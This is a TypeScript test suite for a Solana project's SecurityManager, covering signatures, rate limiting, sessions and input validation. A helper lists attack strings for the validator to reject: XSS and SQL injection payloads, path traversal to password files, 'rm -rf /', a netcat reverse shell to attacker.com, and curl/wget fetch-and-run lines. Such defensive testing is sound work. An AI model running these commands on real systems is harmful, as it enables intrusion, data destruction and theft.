/**
 * Comprehensive Security Manager Tests
 * Following testing_standards.mdc - Security Testing Requirements
 */

// @ts-expect-error - Bun test types
import { describe, test, expect, beforeEach } from 'bun:test';
import { PublicKey, Keypair } from '@solana/web3.js';
import nacl from 'tweetnacl';
import {
  SecurityManager,
  SecurityConfig,
  SecurityEventType,
  SecureBuffer,
} from '../../security/SecurityManager';

// Test Configuration
const testConfig: SecurityConfig = {
  enableInputValidation: true,
  enableRateLimiting: true,
  enableAuditLogging: true,
  maxRequestSize: 1024 * 1024, // 1MB
  allowedOrigins: ['https://test.example.com'],
  requireAuthentication: true,
  sessionTimeoutMs: 3600000, // 1 hour
  maxFailedAttempts: 5,
  lockoutDurationMs: 900000, // 15 minutes
};

// Test Utilities
class SecurityTestUtils {
  static generateMaliciousInputs() {
    return {
      xssPayloads: [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)">',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<body onload="alert(1)">',
        '<div onclick="alert(1)">click</div>',
        '<style>@import"javascript:alert(1)"</style>',
      ],

      sqlInjection: [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "' OR 1=1 #",
      ],

      commandInjection: [
        '; rm -rf /',
        '&& cat /etc/passwd',
        '| nc attacker.com 4444 -e /bin/sh',
        '`curl attacker.com/steal.sh | sh`',
        '$(wget -O - attacker.com/payload)',
      ],

      pathTraversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      ],
    };
  }

  static createTestRequestInfo(overrides: any = {}) {
    return {
      method: 'POST',
      path: '/api/test',
      ip: '192.168.1.100',
      userAgent: 'Mozilla/5.0 (Test Browser)',
      ...overrides,
    };
  }

  static async measureMemoryUsage(): Promise<number> {
    const used = process.memoryUsage();
    return used.heapUsed / 1024 / 1024; // MB
  }
}

// Mock validation schema for testing
class TestValidationSchema {
  validate(input: any) {
    if (typeof input === 'string' && input.length <= 100) {
      return { valid: true, data: input };
    }
    return { valid: false, error: 'Invalid input' };
  }
}

describe('SecurityManager - Comprehensive Security Tests', () => {
  let securityManager: SecurityManager;
  let testKeypair: Keypair;

  beforeEach(() => {
    securityManager = new SecurityManager(testConfig);
    testKeypair = Keypair.generate();
  });

  describe('CRITICAL-01: Authentication & Authorization', () => {
    test('should verify valid signatures correctly', async () => {
      const message = new TextEncoder().encode('test message');
      const signature = nacl.sign.detached(message, testKeypair.secretKey);

      const isValid = await securityManager.verifySignature(
        message,
        signature,
        testKeypair.publicKey
      );

      expect(isValid).toBe(true);
    });

    test('should reject invalid signatures', async () => {
      const message = new TextEncoder().encode('test message');
      const fakeSignature = new Uint8Array(64).fill(0);

      const isValid = await securityManager.verifySignature(
        message,
        fakeSignature,
        testKeypair.publicKey
      );

      expect(isValid).toBe(false);
    });

    test('should validate capabilities correctly', () => {
      const capabilities = 0b1111; // All capabilities
      const requiredRead = 0b0001;
      const requiredWrite = 0b0010;
      const requiredAdmin = 0b1000;
      const invalidRequired = 0b10000; // Not granted

      expect(securityManager.hasCapability(capabilities, requiredRead)).toBe(
        true
      );
      expect(securityManager.hasCapability(capabilities, requiredWrite)).toBe(
        true
      );
      expect(securityManager.hasCapability(capabilities, requiredAdmin)).toBe(
        true
      );
      expect(securityManager.hasCapability(capabilities, invalidRequired)).toBe(
        false
      );
    });
  });

  describe('CRITICAL-02: Input Validation & Sanitization', () => {
    const schema = new TestValidationSchema();

    test('should detect and block XSS attacks', () => {
      const maliciousInputs =
        SecurityTestUtils.generateMaliciousInputs().xssPayloads;

      for (const payload of maliciousInputs) {
        const result = securityManager.validateInput(payload, schema);

        if (result.valid && result.sanitized) {
          // If not blocked, should be properly sanitized
          expect(result.sanitized).not.toContain('<script');
          expect(result.sanitized).not.toContain('javascript:');
          expect(result.sanitized).not.toContain('onerror');
          expect(result.sanitized).not.toContain('onload');
        } else {
          // Should be blocked with proper error
          expect(result.error).toBeDefined();
        }
      }
    });

    test('should detect and block SQL injection attempts', () => {
      const maliciousInputs =
        SecurityTestUtils.generateMaliciousInputs().sqlInjection;

      for (const payload of maliciousInputs) {
        const result = securityManager.validateInput(payload, schema);

        // Should either block or sanitize
        if (result.valid && result.sanitized) {
          expect(result.sanitized).not.toMatch(/union\s+select/i);
          expect(result.sanitized).not.toMatch(/drop\s+table/i);
          expect(result.sanitized).not.toMatch(/delete\s+from/i);
        } else {
          expect(result.error).toBeDefined();
        }
      }
    });

    test('should detect and block command injection attempts', () => {
      const maliciousInputs =
        SecurityTestUtils.generateMaliciousInputs().commandInjection;

      for (const payload of maliciousInputs) {
        const result = securityManager.validateInput(payload, schema);

        // Should block command injection
        expect(result.valid).toBe(false);
        expect(result.error).toBeDefined();
      }
    });
  });

  describe('CRITICAL-03: Rate Limiting & DoS Protection', () => {
    test('should allow requests under rate limit', async () => {
      const requestInfo = SecurityTestUtils.createTestRequestInfo();

      for (let i = 0; i < 5; i++) {
        const result = await securityManager.checkRateLimit(
          'test-client',
          requestInfo,
          10, // limit
          60000 // window
        );

        expect(result.allowed).toBe(true);
        expect(result.remaining).toBe(10 - (i + 1));
      }
    });

    test('should block requests exceeding rate limit', async () => {
      const requestInfo = SecurityTestUtils.createTestRequestInfo();
      const limit = 3;

      // Use up the limit
      for (let i = 0; i < limit; i++) {
        await securityManager.checkRateLimit(
          'test-client',
          requestInfo,
          limit,
          60000
        );
      }

      // Next request should be blocked
      const result = await securityManager.checkRateLimit(
        'test-client',
        requestInfo,
        limit,
        60000
      );

      expect(result.allowed).toBe(false);
      expect(result.reason).toBe('rate_limit_exceeded');
      expect(result.retryAfter).toBeGreaterThan(0);
    });

    test('should detect suspicious activity patterns', async () => {
      const requestInfo = SecurityTestUtils.createTestRequestInfo();

      // Simulate rapid fire requests (suspicious pattern)
      for (let i = 0; i < 15; i++) {
        const result = await securityManager.checkRateLimit(
          'suspicious-client',
          requestInfo,
          100, // High limit to test pattern detection
          60000
        );

        if (!result.allowed && result.reason === 'suspicious_activity') {
          expect(result.suspicionScore).toBeGreaterThan(0.8);
          break;
        }
      }
    });
  });

  describe('CRITICAL-04: Session Management', () => {
    test('should create valid sessions', () => {
      const sessionId = securityManager.createSession('test-agent', 0b1111);

      expect(sessionId).toBeDefined();
      expect(typeof sessionId).toBe('string');
      expect(sessionId.length).toBeGreaterThan(0);
    });

    test('should validate active sessions', () => {
      const sessionId = securityManager.createSession('test-agent', 0b1111);

      const validation = securityManager.validateSession(sessionId);

      expect(validation.valid).toBe(true);
      expect(validation.session).toBeDefined();
      expect(validation.session?.agentId).toBe('test-agent');
    });

    test('should reject invalid session IDs', () => {
      const validation = securityManager.validateSession('invalid-session-id');

      expect(validation.valid).toBe(false);
      expect(validation.reason).toBe('session_not_found');
    });
  });

  describe('CRITICAL-05: Cryptographic Security', () => {
    test('should create secure buffers correctly', () => {
      const buffer = new SecureBuffer(32);

      expect(buffer).toBeDefined();
      expect(buffer.getData().length).toBe(32);
    });

    test('should perform constant-time comparison', () => {
      const data1 = new Uint8Array([1, 2, 3, 4]);
      const data2 = new Uint8Array([1, 2, 3, 4]);
      const data3 = new Uint8Array([1, 2, 3, 5]);

      const buffer1 = SecureBuffer.from(data1);

      expect(buffer1.compare(data2)).toBe(true);
      expect(buffer1.compare(data3)).toBe(false);
    });

    test('should clear sensitive data on buffer clear', () => {
      const buffer = new SecureBuffer(32);

      buffer.clear();
      const clearedData = buffer.getData();

      // All bytes should be zero after clear
      expect(clearedData.every((byte) => byte === 0)).toBe(true);
    });

    test('should reject invalid buffer sizes', () => {
      expect(() => new SecureBuffer(0)).toThrow('Invalid buffer size');
      expect(() => new SecureBuffer(-1)).toThrow('Invalid buffer size');
      expect(() => new SecureBuffer(2 * 1024 * 1024)).toThrow(
        'Invalid buffer size'
      ); // > 1MB
    });
  });

  describe('HIGH-RISK: Security Reporting & Monitoring', () => {
    test('should generate comprehensive security reports', () => {
      // Create some activity
      const sessionId = securityManager.createSession('test-agent', 0b1111);
      securityManager.validateSession(sessionId);

      const report = securityManager.generateSecurityReport();

      expect(report).toBeDefined();
      expect(report.timestamp).toBeDefined();
      expect(report.config).toBeDefined();
      expect(report.metrics).toBeDefined();
      expect(report.systemHealth).toBeDefined();

      expect(report.metrics.activeSessions).toBeGreaterThanOrEqual(0);
      expect(report.metrics.recentEvents).toBeGreaterThanOrEqual(0);
      expect(['healthy', 'warning', 'critical']).toContain(report.systemHealth);
    });

    test('should track security events correctly', async () => {
      // Generate some security events
      await securityManager.verifySignature(
        new Uint8Array([1, 2, 3]),
        new Uint8Array(64).fill(0),
        testKeypair.publicKey
      );

      const report = securityManager.generateSecurityReport();

      expect(report.metrics.recentEvents).toBeGreaterThan(0);
    });

    test('should assess system health accurately', () => {
      const report = securityManager.generateSecurityReport();

      // With no critical events, should be healthy
      expect(report.systemHealth).toBe('healthy');
    });
  });

  describe('PERFORMANCE: Security Operation Performance', () => {
    test('should validate inputs efficiently', () => {
      const schema = new TestValidationSchema();
      const startTime = performance.now();

      // Validate 1000 inputs
      for (let i = 0; i < 1000; i++) {
        securityManager.validateInput(`test input ${i}`, schema);
      }

      const endTime = performance.now();
      const duration = endTime - startTime;

      // Should complete in reasonable time (less than 1 second)
      expect(duration).toBeLessThan(1000);
    });

    test('should handle rate limiting efficiently', async () => {
      const requestInfo = SecurityTestUtils.createTestRequestInfo();
      const startTime = performance.now();

      // Check rate limit 1000 times
      for (let i = 0; i < 1000; i++) {
        await securityManager.checkRateLimit(
          `client-${i}`,
          requestInfo,
          10,
          60000
        );
      }

      const endTime = performance.now();
      const duration = endTime - startTime;

      // Should complete in reasonable time (less than 2 seconds)
      expect(duration).toBeLessThan(2000);
    });
  });

  describe('EDGE CASES: Security Edge Case Handling', () => {
    test('should handle null and undefined inputs safely', () => {
      const schema = new TestValidationSchema();

      const nullResult = securityManager.validateInput(null, schema);
      const undefinedResult = securityManager.validateInput(undefined, schema);

      // Should handle gracefully without crashing
      expect(nullResult).toBeDefined();
      expect(undefinedResult).toBeDefined();
    });

    test('should handle extremely large inputs', () => {
      const schema = new TestValidationSchema();
      const largeInput = 'x'.repeat(1000); // Large string

      const result = securityManager.validateInput(largeInput, schema);

      // Should handle without crashing (may reject for size)
      expect(result).toBeDefined();
    });
  });
});

describe('SecureBuffer - Dedicated Tests', () => {
  test('should create buffer with specified size', () => {
    const buffer = new SecureBuffer(64);
    expect(buffer.getData().length).toBe(64);
  });

  test('should create buffer from existing data', () => {
    const sourceData = new Uint8Array([1, 2, 3, 4, 5]);
    const buffer = SecureBuffer.from(sourceData);

    expect(buffer.getData()).toEqual(sourceData);
  });

  test('should perform timing-safe comparison', () => {
    const data = new Uint8Array([1, 2, 3, 4]);
    const buffer = SecureBuffer.from(data);

    const sameData = new Uint8Array([1, 2, 3, 4]);
    const differentData = new Uint8Array([1, 2, 3, 5]);
    const differentLength = new Uint8Array([1, 2, 3]);

    expect(buffer.compare(sameData)).toBe(true);
    expect(buffer.compare(differentData)).toBe(false);
    expect(buffer.compare(differentLength)).toBe(false);
  });

  test('should clear data securely', () => {
    const buffer = new SecureBuffer(32);

    buffer.clear();
    const clearedData = buffer.getData();

    // Should be all zeros
    expect(clearedData.every((byte) => byte === 0)).toBe(true);
  });
});

// Integration Tests
describe('Security Integration Tests', () => {
  test('should handle complete security workflow', async () => {
    const manager = new SecurityManager(testConfig);
    const keypair = Keypair.generate();
    const schema = new TestValidationSchema();

    // 1. Create session
    const sessionId = manager.createSession('integration-test-agent', 0b1111);
    expect(sessionId).toBeDefined();

    // 2. Validate session
    const sessionValidation = manager.validateSession(sessionId);
    expect(sessionValidation.valid).toBe(true);

    // 3. Check rate limit
    const requestInfo = SecurityTestUtils.createTestRequestInfo();
    const rateLimitResult = await manager.checkRateLimit(
      'integration-client',
      requestInfo
    );
    expect(rateLimitResult.allowed).toBe(true);

    // 4. Validate input
    const inputResult = manager.validateInput('valid test input', schema);
    expect(inputResult.valid).toBe(true);

    // 5. Verify signature
    const message = new TextEncoder().encode('integration test message');
    const signature = nacl.sign.detached(message, keypair.secretKey);
    const signatureValid = await manager.verifySignature(
      message,
      signature,
      keypair.publicKey
    );
    expect(signatureValid).toBe(true);

    // 6. Generate security report
    const report = manager.generateSecurityReport();
    expect(report.systemHealth).toBe('healthy');
    expect(report.metrics.activeSessions).toBeGreaterThan(0);
  });
});
